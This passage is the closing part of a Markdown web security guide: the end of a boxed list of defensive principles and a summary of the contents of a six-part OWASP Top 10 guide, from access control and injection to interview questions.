│  • Least privilege (minimum permissions)                                   │
│  • Fail securely (deny by default)                                        │
│  • Don't trust client input (ever)                                        │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

*OWASP Top 10 Complete Guide - All 6 Parts Complete*

**Guide Summary:**
- Part 1: Core concepts, attack surface visualization, defense in depth
- Part 2: Broken Access Control, Cryptographic Failures, Injection
- Part 3: XSS, CSRF, Security Misconfiguration
- Part 4: SSRF, Logging, Vulnerable Components, Real-World Scenarios
- Part 5: Common Mistakes, Anti-Patterns, When NOT To
- Part 6: Comprehensive Interview Q&A (16+ questions)

